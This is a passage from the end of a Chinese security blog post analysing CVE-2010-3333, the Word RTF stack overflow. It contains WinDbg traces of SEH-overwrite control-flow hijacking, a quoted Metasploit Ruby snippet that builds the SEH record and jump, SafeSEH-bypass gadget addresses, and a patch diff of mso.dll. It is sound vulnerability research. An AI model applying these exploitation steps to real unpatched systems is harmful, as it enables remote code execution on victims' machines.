class="number">0x1104c830</span></span><br><span class="line">   +<span class="number">0x0a4</span> <span class="built_in">Ebx</span>              : <span class="number">0x5000000</span></span><br><span class="line">   +<span class="number">0x0a8</span> <span class="built_in">Edx</span>              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x0ac</span> <span class="built_in">Ecx</span>              : <span class="number">0x22</span></span><br><span class="line">   +<span class="number">0x0b0</span> <span class="built_in">Eax</span>              : <span class="number">0xc8ac</span></span><br><span class="line">   +<span class="number">0x0b4</span> <span class="built_in">Ebp</span>              : <span class="number">0x1237ec</span></span><br><span class="line">   +<span class="number">0x0b8</span> <span class="built_in">Eip</span>              : <span class="number">0x30ed442c</span></span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : <span class="number">0x1b</span></span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : <span class="number">0x10206</span></span><br><span class="line">   +<span class="number">0x0c4</span> <span class="built_in">Esp</span>              : <span class="number">0x1237b4</span></span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>]  <span class="string">"???"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</span><br><span class="line">Breakpoint <span class="number">6</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=30001bdd <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdd <span class="built_in">esp</span>=001233e4 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdd</span>:</span><br><span class="line">30001bdd <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span> &lt;---- 弹出异常处理函数返回地址</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dd</span> <span class="built_in">esp</span></span><br><span class="line">001233e4  7c9232a8 001234cc 0012ffb0 001234e8</span><br><span class="line">001233f4  001234a0 0012ffb0 7c9232bc 0012ffb0</span><br><span class="line"><span class="number">00123404</span>  001234b4 7c92327a 001234cc 0012ffb0</span><br><span class="line"><span class="number">00123414</span>  001234e8 001234a0 30001bdd <span class="number">00130000</span></span><br><span class="line"><span class="number">00123424</span>  001234cc 0012ffb0 7c94a9ef 001234cc</span><br><span class="line"><span class="number">00123434</span>  0012ffb0 001234e8 001234a0 30001bdd</span><br><span class="line"><span class="number">00123444</span>  <span class="number">00130000</span> 001234cc 1104c830 <span class="number">00000000</span></span><br><span class="line"><span class="number">00123454</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=7c9232a8 <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bde <span class="built_in">esp</span>=001233e8 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bde</span>:</span><br><span class="line">30001bde <span class="number">59</span>              <span class="keyword">pop</span>     <span class="built_in">ecx</span> &lt;---- 弹出第一个参数,_EXCEPTION_RECORD结构体指针</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=30001bdf <span class="built_in">esp</span>=001233ec <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">WINWORD+<span class="number">0x1bdf</span>:</span><br><span class="line">30001bdf c3              <span class="keyword">ret</span> &lt;---- 返回到第二个参数(<span class="number">0x0012ffb0</span>,ERR地址),也就是ERR-&gt;Next的内容形成的指令</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=0012ffb0 <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">0012ffb0 eb06            <span class="keyword">jmp</span>     0012ffb8 &lt;---- (<span class="keyword">jmp</span> short,<span class="number">0x0012ffb8</span>-<span class="number">0x0012ffb2</span>=<span class="number">0x06</span>,其<span class="number">16</span>进制补码也为<span class="number">0x06</span>,目的地址与当前指令的下一条指令的地址之差)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; <span class="built_in">dt</span> _EXCEPTION_REGISTRATION_RECORD 0012ffb0</span><br><span class="line">ntdll!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : <span class="number">0xa29706eb</span> _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : <span class="number">0x30001bdd</span>     _EXCEPTION_DISPOSITION  +<span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=0012ffb8 <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">0012ffb8 e91f38ffff      <span class="keyword">jmp</span>     001237dc &lt;---- (<span class="keyword">jmp</span> <span class="built_in">near</span>,<span class="number">0x001237dc</span>-<span class="number">0x0012ffbd</span>=-<span class="number">51169</span>,其<span class="number">16</span>进制补码为<span class="number">0xFFFF381F</span>)</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; </span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=<span class="number">00000000</span> <span class="built_in">ecx</span>=001234cc <span class="built_in">edx</span>=7c9232bc <span class="built_in">esi</span>=<span class="number">00000000</span> <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=001237dc <span class="built_in">esp</span>=001233f0 <span class="built_in">ebp</span>=<span class="number">00123404</span> iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">001237dc b8e69036d6      <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="number">0D63690E6h</span> &lt;---- Shellcode第一条指令</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如上所述，我们已经分析了<code>覆盖SEH记录</code>，以及<code>发生异常</code>后，系统是怎样调用<code>SEH异常处理程序</code>的，还有通过<code>pop/pop/ret</code>形式的<code>ROPGadget</code>跳转到栈上构造的<code>用于跳转到Shellcode的指令</code>去执行，最终跳转到<code>Shellcode</code>执行。</p>
<p>&emsp;&emsp;<code>此过程</code>可以简化为<code>下图</code>所示：</p>
<p><img src="/resources/2020/CVE-2010-3333/覆盖SEH劫持控制流示意图.png" alt="覆盖SEH劫持控制流示意图"></p>
<p>&emsp;&emsp;<code>msf</code>中提供的<code>漏洞利用模块</code>就是使用<code>覆盖SEH记录</code>达成控制流劫持的。其中如下部分，就是<code>关键部分</code>，用于构建上图中的<code>4，5两步骤</code>：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_target</span><span class="params">(rest, targ)</span></span></span><br><span class="line">    targ[<span class="string">'Offsets'</span>].each &#123; <span class="params">|off|</span></span><br><span class="line">        <span class="comment"># Rex::Exploitation::Seh</span></span><br><span class="line">        seh = generate_seh_record(targ.ret) <span class="comment"># 生成SEH记录,"\xeb\x06xxxx",jmp short $+0x06</span></span><br><span class="line">        rest[off, seh.length] = seh</span><br><span class="line">        distance = off + seh.length</span><br><span class="line">        <span class="comment"># jmp near $-,e9xxxxxxxx,SEH记录之后，用于跳转到Shellcode执行的指令</span></span><br><span class="line">        jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, <span class="string">"jmp $-"</span> + distance.to_s).encode_string</span><br><span class="line">        rest[off + seh.length, jmp_back.length] = jmp_back</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><strong><code>环境：</code></strong>Win7&amp;Office2007</p>
<p>&emsp;&emsp;在<code>Windows7</code>中，已经引入了SEH校验机制<code>SafeSEH</code>。所以我们需要在<code>未启用SafeSEH机制</code>的模块中寻找<code>POP/POP/RET</code>形式的<code>ROPGadget</code>，来<code>bypass SafeSEH</code>。通过<code>mona</code>插件，我们可以知道<code>msxml5.dll</code>并未启用<code>SafeSEH机制</code>，而且在其中找到了<code>POP/POP/RET</code>形式的ROPGadget，其位于地址<code>0x78812890</code>处。</p>
<h3 id="0x43-Office2003和Office2007-Exploit的通用性"><a href="#0x43-Office2003和Office2007-Exploit的通用性" class="headerlink" title="0x43 Office2003和Office2007 Exploit的通用性"></a>0x43 Office2003和Office2007 Exploit的通用性</h3><p>&emsp;&emsp;在前面通过<code>覆盖返回地址</code>劫持控制流的方法中，因为<code>XP&amp;Office2003</code>和<code>Win7&amp;Office2007</code>的环境下，<code>Office2003</code>和<code>Office2007</code>的<code>Word.exe</code>都是<code>未启用DEP</code>的，所以都可以通过<code>覆盖返回地址</code>，在<code>栈</code>上执行<code>Shellcode</code>。而在<code>Windows7</code>中是支持<code>映像ASLR</code>的，所以需要在<code>未启用ASLR</code>的模块中，寻找<code>“jmp esp”</code>形式的<code>ROPGadget</code>。如果可以找到在两种环境下<code>通用的ROPGadget</code>，就可以实现<code>Exploit的通用性</code>。</p>
<p>&emsp;&emsp;对于通过<code>覆盖SEH记录</code>劫持控制流的方法，我们需要关心的是<code>当前环境</code>是否启用<code>SafeSEH</code>和<code>SEHOP</code>。<code>Windows XP</code>是不支持<code>SEHOP</code>的，虽然<code>Windows7</code>支持<code>SEHOP</code>，但是其默认是<code>关闭</code>的。而<code>SafeSEH</code>在<code>Windows XP</code>和<code>Windows7</code>上都是支持的，所以我们需要<code>bypass SafeSEH</code>。这里使用的方法就是利用<code>未启用SafeSEH的模块</code>bypass SafeSEH，我们需要在<code>未启用SafeSEH的模块</code>中找到用于<code>SEH劫持</code>的<code>POP/POP/RET</code>形式的<code>ROPGadget</code>。如果模块<code>未启用SafeSEH</code>，并且该模块不是仅包含<code>中间语言</code>(IL,.Net编译)，这个异常处理就<code>可以被执行</code>。</p>
<p>&emsp;&emsp;在<code>XP&amp;Office2003</code>环境下，pFragments缓冲区起始地址为<code>0x001237dc</code>，栈底为<code>0x00130000</code>，0x00130000-0x001237dc=<code>0xc824</code>。在<code>Win7&amp;Office2007</code>的环境下，pFragments缓冲区起始地址为<code>0x0011fdf4</code>，栈底为<code>0x00130000</code>，0x00130000-0x0011fdf4=<code>0x1020c(关闭ASLR)</code>。<code>未关闭ASLR</code>的情况下，都是<code>大于0x10000</code>的。msf样本生成脚本中，使用的<code>复制数据长度</code>为<code>0xc8ac</code>，这也是为什么用msf生成的样本在<code>XP&amp;Office2003</code>环境下，<code>复制过程中</code>就会触发<code>内存访问异常</code>，而在<code>Win7&amp;Office2007</code>的环境下，<code>数据复制完成</code>后，对<code>已经覆盖的栈数据</code>进行访问时才触发<code>内存访问异常</code>。发生异常的原因，和<code>“覆盖返回地址”</code>节的一样，<code>sub_30F0B5C2</code>(Office2003)/<code>sub_32E5955E</code>(Office2007)的<code>第5个参数</code>未被修改为<code>0x0</code>，<code>sub_30F0B5C2</code>/<code>sub_32E5955E</code>返回前对<code>已覆盖的栈数据</code>进行访问，造成<code>异常</code>。</p>
<p>&emsp;&emsp;<code>“漏洞战争”</code>中，<code>泉哥</code>提供的思路是<code>Office2003</code>通过<code>覆盖返回地址</code>进行漏洞利用，被利用来<code>覆盖返回地址的地址</code>是<code>0x0026762f</code>，在<code>Office2003</code>下是<code>“call esp”</code>的地址，该地址适用于<code>Office2003 SP0-SP3</code>等各个子版本，属于稳定的跳转地址。而在<code>Office2007</code>中，<code>0x0026762f</code>已不再是call/jmp esp形式的指令，但是用此地址覆盖<code>Office2007</code>中<code>关键函数sub_32E5955E</code>的<code>返回地址</code>，会造成<code>异常</code>，继而转入<code>SEH异常处理程序</code>。我们只需要同时覆盖<code>Office2007</code>环境下栈中最近的<code>SEH记录</code>，就可以劫持SEH异常处理程序。</p>
<p><img src="/resources/2020/CVE-2010-3333/通用Exploit的栈布局.png" alt="通用Exploit的栈布局"></p>
<p>&emsp;&emsp;在<code>msf漏洞利用模块</code>中，<code>Targets</code>中有一个<code>“Automatic”</code>选项，其作用是将<code>多个环境</code>的<code>相关Target数据</code>糅合到<code>一个样本</code>中，达到<code>Exploit的通用性</code>。因为<code>msf漏洞利用模块</code>对于所有环境，使用的都是<code>覆盖SEH记录</code>进行漏洞利用，而不同环境下<code>SEH记录</code>距<code>缓冲区起始地址</code>的<code>Offset</code>各不相同，所以很少会出现<code>数据冲突</code>的情况。</p>
<h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p><strong><code>环境：</code></strong>Win7&amp;Office2007</p>
<p>&emsp;&emsp;既然要分析<code>这个漏洞</code>官方是<code>怎么修复</code>的，首先要找到<code>此漏洞对应的补丁</code>。由于漏洞年代久远，<code>Microsoft的网站</code>又发生了很大的改变，<code>补丁的下载页面</code>已经找不到了，只找到如下<code>两个链接</code>：<br>1、<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-087" target="_blank" rel="noopener">Microsoft 安全公告 MS10-087 - 严重</a><br>2、<a href="https://support.microsoft.com/zh-cn/help/2423930/ms10-087-vulnerabilities-in-microsoft-office-could-allow-remote-code-e" target="_blank" rel="noopener">MS10-087：Microsoft Office 中的漏洞可能允许远程代码执行</a></p>
<p>&emsp;&emsp;虽然当时的<code>补丁公告页面</code>已经无法下载补丁了，但是我们可以通过官方提供的<a href="https://www.catalog.update.microsoft.com/" target="_blank" rel="noopener">补丁下载站</a>下载指定补丁。我们可以使用<code>KB编号</code>(Knowledge Base:知识库)进行搜索，或者使用此漏洞的<code>微软漏洞编号MS10-087</code>进行搜索就可以了。</p>
<p>&emsp;&emsp;我下载的是<code>Office2007</code>的补丁。我的分析环境中使用的是<code>Office2007</code>，未安装任何<code>Service Pack</code>包。如果<code>直接安装</code>这个补丁的话，会提示<code>下图所示错误</code>：</p>
<p><img src="/resources/2020/CVE-2010-3333/补丁安装错误.png" alt="补丁安装错误"></p>
<p>&emsp;&emsp;这里提示说有<code>两个原因</code>，<code>原因一</code>是升级修补程序可能更新的是不同版本的程序，也就是说，我们<code>安装的版本</code>与<code>补丁检测的版本</code>不匹配。<code>原因二</code>是升级修补程序不正确，也就是说<code>补丁安装程序损坏了</code>。经过思考，<code>第一种</code>的可能性大一点，我又查看了一下<code>此漏洞的公告</code>，公告中说此漏洞影响的是<code>Office2007SP2</code>版本，所以就想到可能是因为我没有安装<code>Office2007SP2升级包</code>。安装完<code>Office2007SP2升级包</code>，此漏洞的补丁就可以安装了。如下是<code>补丁安装前后</code>mso.dll的版本号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、SP2安装前：12.0.4518.1014</span><br><span class="line">2、SP2安装后：12.0.6425.1000</span><br><span class="line">3、补丁安装后：12.0.6545.5004</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我这里使用的是<code>“12.0.4518.1014”</code>和<code>“12.0.6545.5004”</code>进行对比。这里要吐槽一下<code>BinDiff</code>这个工具，分析实在是太慢了。第一次我是用的是<code>BinDiff4.3&amp;IDA Pro6.8</code>进行分析，结果我电脑开了一晚上也没分析完，<code>前一个漏洞</code>我也是用<code>此版本</code>来分析的，没出现<code>任何问题</code>。我看了一下<code>BinDiff的文档</code>，看到<code>BinDiff4.3</code>是基于<code>IDA SDK6.95</code>的，会不会是因为IDA的版本低了?又看到<code>BinDiff4.2</code>是基于<code>IDA SDK6.8</code>构建的，所以就想<code>BinDiff4.2&amp;IDA Pro6.8</code>的组合应该没问题了吧。开始尝试，经过<code>一段很长的时间</code>，我终于成功了。期间，我还试了<code>BinDiff5&amp;IDA Pro7.2</code>，并未成功，测试的原因是想看看<code>新版本</code>会不会<code>缩短比较的时间</code>。由于<code>此漏洞</code>涉及到的模块<code>mso.dll比较大</code>，生成的<code>idb</code>都在<code>200MB</code>左右，所以需要<code>较长时间</code>，请耐心等待。<code>BinDiff4.3&amp;IDA Pro6.8</code>失败的特征是，<code>BinDiff的进度条</code>一直在显示Diff中，但是<code>BinDiff的进程</code>却在生成<code>.BinDiff</code>文件后，占用<code>很少的CPU</code>，可以分析出<code>BinDiff</code>因为某些原因<code>卡住了</code>，但并未<code>提示错误</code>。</p>
<p>&emsp;&emsp;之前分析<code>漏洞原因</code>时，<code>关键漏洞函数</code>位于<code>“12.0.4518.1014”</code>版<code>mso.dll</code>的<code>sub_32E5955E</code>函数中，通过<code>函数名</code>，我们可以在<code>Matched Functions</code>中快速定位，找到之后，双击，就可以打开<code>“12.0.4518.1014”</code>版<code>mso.dll</code>的<code>sub_32E5955E</code>函数与<code>“12.0.6545.5004”</code>版<code>mso.dll</code>中的对应函数<code>sub_32E0239B</code>的<code>FlowGraphs</code>。通过对比<code>代码块</code>，我们可以快速定位到<code>添加补丁代码</code>的位置。下图是两个<code>函数代码块</code>的对比图：</p>
<div align="left"><img src="/resources/2020/CVE-2010-3333/补丁前后关键函数对比图.png" width="70%" height="50%" alt="补丁前后关键函数对比图"></div>

<p>&emsp;&emsp;我们在<code>IDA</code>中找到<code>多出来</code>的那部分<code>代码块</code>，对其进行<code>详细分析</code>。结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//补丁前关键函数关键代码</span></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_32E5955E@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(_DWORD *)(sub_327A2549(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v8 = *(_DWORD *)v7;</span><br><span class="line">        v16 = <span class="number">83886080</span>;</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, <span class="keyword">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3);</span><br><span class="line">        result = sub_32E5941B(v15, a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17 : <span class="number">0</span>, a6);</span><br><span class="line">        <span class="keyword">if</span> ( result )</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_32E6AEA8(<span class="number">863334498</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//补丁后关键函数关键代码</span></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_32E0239B@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(_DWORD *)(sub_327DAFBD(*(_DWORD *)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);<span class="comment">// v7为关键对象首地址</span></span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v15 = <span class="number">83886080</span>;</span><br><span class="line">        <span class="comment">// 这些条件则为补丁代码</span></span><br><span class="line">        <span class="keyword">if</span> ( v7                                     <span class="comment">// 关键对象首地址不为0</span></span><br><span class="line">            &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">48</span>))(v7) &lt;= <span class="number">4</span><span class="comment">// 复制数据长度不能大于4</span></span><br><span class="line">            &amp;&amp; (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a4<span class="comment">// 关键对象第一个成员变量&gt;a4</span></span><br><span class="line">            &amp;&amp; (*(<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">44</span>))(v7) &gt; a3<span class="comment">// 关键对象第一个成员变量&gt;a3</span></span><br><span class="line">            &amp;&amp; a3 &gt;= <span class="number">0</span></span><br><span class="line">            &amp;&amp; a4 &gt;= <span class="number">0</span></span><br><span class="line">            <span class="comment">// 将pFragments属性数据复制到栈上的虚函数</span></span><br><span class="line">            &amp;&amp; ((*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span> *, <span class="keyword">int</span>))(*(_DWORD *)v7 + <span class="number">28</span>))(v7, &amp;v14, a3),</span><br><span class="line">            (<span class="keyword">unsigned</span> __int8)sub_32E02258(v14, a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v16 : <span class="number">0</span>, a6)) )</span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_32E197A4(<span class="number">863334498</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;可以看到<code>补丁</code>后的<code>关键函数</code>中只有满足了那个<code>关键if</code>中的<code>很多条件</code>才能执行到将<code>pFragments属性数据</code>复制到<code>栈上</code>的<code>虚函数</code>。因为涉及到了<code>很多虚函数</code>，只是<code>静态分析</code>是不行的，所以要结合<code>动态调试</code>确定<code>虚函数的地址</code>，进而分析<code>虚函数的功能</code>。功能我已经分析完，写在了上面<code>代码的注释</code>中。其中<code>第一个条件</code>就是判断<code>pFragments属性数据长度</code>的。如果pFragments属性数据<code>大于4字节</code>，则不再执行<code>内存复制</code>，直接返回，从而解决了此漏洞。</p>
<h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote>
<ul>
<li>1.漏洞战争:软件漏洞分析精要 2.4 CVE-2010-3333 Microsoft RTF栈溢出漏洞</li>
<li>2.0day安全:软件漏洞分析技术 第3章、第6章、第2篇</li>
<li>3.加密与解密(第4版) 第8章 Windows下的异常处理</li>
<li>4.精通Metasploit渗透测试(第2版) 第3章 渗透模块的开发过程</li>
<li>5.Metasploit渗透测试魔鬼训练营 6.6 针对Office软件的渗透攻击案例——MS10-087安全漏洞</li>
<li>6.<a href="https://web.archive.org/web/20190708132914/http://www.kleinlercher.at/tools/Windows_Protocols/Word2007RTFSpec9.pdf" target="_blank" rel="noopener">Rich Text Format (RTF) Specification Version 1.9.1</a></li>
<li>7.<a href="https://www.fireeye.com/blog/threat-research/2016/05/how_rtf_malware_evad.html" target="_blank" rel="noopener">How RTF malware evades static signature-based detection</a></li>
</ul>
</blockquote>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2020/12/20/CVE-2010-3333复现与分析/">CVE-2010-3333复现与分析</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
        <p><span>发布时间:</span>2020-12-20, 00:00</p>
        <p><span>最后更新:</span>2020-12-27, 00:16</p>
        
            <p>
                <span>更新历史:</span><i class="fa fa-github"></i>
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2020-12-20.CVE-2010-3333复现与分析.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
